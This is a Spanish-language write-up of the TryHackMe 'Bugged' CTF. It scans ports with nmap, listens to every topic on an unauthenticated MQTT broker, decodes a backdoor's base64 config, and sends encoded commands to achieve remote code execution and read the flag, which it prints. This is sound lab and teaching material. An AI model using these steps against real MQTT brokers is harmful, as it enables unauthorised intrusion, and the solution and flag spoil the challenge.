# 🐞 Bugged — TryHackMe CTF
**Fecha:** 16 de Noviembre, 2025  
**Plataforma:** TryHackMe  
**Autor:** rSamCod  
**Resumen:**  
Esta máquina está orientada a la enumeración de servicios y la explotación de un protocolo IoT **MQTT** mal configurado que expone un *backdoor*. Gracias al análisis de los topics y al envío de payloads en base64 conseguimos **RCE** (Ejecución Remota de Comandos) y la flag.

---
# Fase 1 — Reconocimiento
---

## 1.1 Escaneo rápido de puertos

```bash
sudo nmap -p- -sS --open --min-rate 5000 -vvv 10.201.97.52 -oG allPorts
```

**Parámetros clave:**
- `-p-` → escanea todos los puertos (1-65535)  
- `-sS` → SYN scan (rápido/sigiloso)  
- `--open` → muestra solo puertos abiertos  
- `--min-rate 5000` → fuerza alta tasa de paquetes (acelerar)  
- `-vvv` → verbosidad máxima  
- `-oG` → salida grepeable

---

## 1.2 Mostrar resultados del escaneo

```bash
cat allPorts
```
<img width="1897" height="704" alt="Captura de pantalla 2025-11-16 014249" src="https://github.com/user-attachments/assets/7144167f-641e-4770-9d56-f648551b4354" />

---

## 1.3 Escaneo profundo (servicios)

```bash
nmap -p22,1883 -sV -sC 10.201.97.52 -oN targeted
```
<img width="1901" height="380" alt="Captura de pantalla 2025-11-16 014705" src="https://github.com/user-attachments/assets/20ff9c5c-f704-4192-a6d6-78693e8c281a" />


---

# Fase 2 — Enumeración MQTT

---

## 2.1 Instalar clientes Mosquitto

```bash
sudo apt update && sudo apt install -y mosquitto-clients
```
<img width="1873" height="227" alt="Captura de pantalla 2025-11-16 014823" src="https://github.com/user-attachments/assets/52688bc8-3715-4ffb-98fe-2e58e68001c9" />

Herramientas instaladas: `mosquitto_sub`, `mosquitto_pub`.

---
## 2.2 Suscribirse a todos los topics

```bash
mosquitto_sub -h 10.201.97.52 -t "#" -v
```

**Notas:**
- `-h` → host del broker.  
- `-t "#"` → wildcard que suscribe a todos los topics.  
- `-v` → muestra `topic message`.
<img width="1902" height="836" alt="Captura de pantalla 2025-11-16 014941" src="https://github.com/user-attachments/assets/b4c559d1-5a17-45c7-9abd-b618c51fe38a" />
Durante la escucha apareció un mensaje base64 en un topic sospechoso.

---

# Fase 3 — Análisis del mensaje sospechoso

Decodificamos la cadena Base64:

```bash
echo "<MENSAJE_BASE64>" | base64 -d
```

Salida:

```json
{
  "id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d",
  "registered_commands": ["HELP","CMD","SYS"],
  "pub_topic": "U4vyqNlQtf/0voZmaZyLT/15H9TF6CHg/pub",
  "sub_topic": "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"
}
```

<img width="1893" height="222" alt="Captura de pantalla 2025-11-16 015048" src="https://github.com/user-attachments/assets/0f4b3c89-4421-4d83-b29b-d8f05bb96428" />

El JSON revela un backdoor con `sub_topic` para enviar comandos y `pub_topic` para leer respuestas.

---

# Fase 4 — Explotación (RCE)

---

## 4.1 Terminal oyente (leer respuestas)

```bash
mosquitto_sub -h 10.201.97.52 -t "U4vyqNlQtf/0voZmaZyLT/15H9TF6CHg/pub" -v
```

---

## 4.2 Terminal atacante (prueba simple)

```bash
mosquitto_pub -h 10.201.97.52 -t "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub" -m "HOLA"
```

<img width="1898" height="167" alt="Captura de pantalla 2025-11-16 015601" src="https://github.com/user-attachments/assets/1cf96908-b552-43df-a906-254aa15d18eb" />

Respuesta: `Invalid message format. Format: base64({"id":"<id>","cmd":"<CMD>","arg":"<ARG>"})`

<img width="1899" height="218" alt="Captura de pantalla 2025-11-16 015723" src="https://github.com/user-attachments/assets/bc4f6eb9-be47-4c05-96b3-4863db71febe" />

<img width="1906" height="208" alt="Captura de pantalla 2025-11-16 015823" src="https://github.com/user-attachments/assets/fc075d76-0875-4cd0-b790-76f2e4a8a617" />

---

## 4.3 Enviar comando `ls`

Construir payload JSON y codificar sin salto de línea:

```bash
echo -n '{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","cmd":"CMD","arg":"ls"}' | base64
```
<img width="955" height="61" alt="Captura de pantalla 2025-11-15 203900" src="https://github.com/user-attachments/assets/ef887ee0-7055-4e8a-a3af-ffd022d4186d" />

Enviar el payload por mosquitto_pub


Respuesta (oyente) en base64; al decodificar se ve:

```
flag.txt
```

<img width="1888" height="87" alt="Captura de pantalla 2025-11-16 020155" src="https://github.com/user-attachments/assets/e6e9831a-08c0-4e06-a391-1de89a34f313" />

---

## 4.4 Leer la flag

Codificar y enviar:

```bash
echo -n '{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","cmd":"CMD","arg":"cat flag.txt"}' | base64
```

Enviar con `mosquitto_pub` (igual que antes).

<img width="1898" height="119" alt="Captura de pantalla 2025-11-16 020327" src="https://github.com/user-attachments/assets/ee8a1105-20da-4659-890d-87a254bb5cf9" />

La respuesta final será una cadena base64:

<img width="1902" height="231" alt="Captura de pantalla 2025-11-16 020253" src="https://github.com/user-attachments/assets/5ca97420-cd44-420b-a98e-0489380b73b8" />


Decodificar:

```bash
echo "message_base64" | base64 -d
```

<img width="1898" height="525" alt="Captura de pantalla 2025-11-16 020327" src="https://github.com/user-attachments/assets/9c49306b-eea0-4080-b25f-cc64276240d3" />

Resultado:

```
flag{18d44fc0707ac8dc8be45bb83db54013}
```

---

# Lecciones aprendidas

- No ignores puertos IoT (ej. 1883).
- Brokers MQTT sin autenticación pueden ser backdoors.
- Los mensajes de error a menudo dan pistas estructurales útiles.
- Base64 es codificación, no protección.
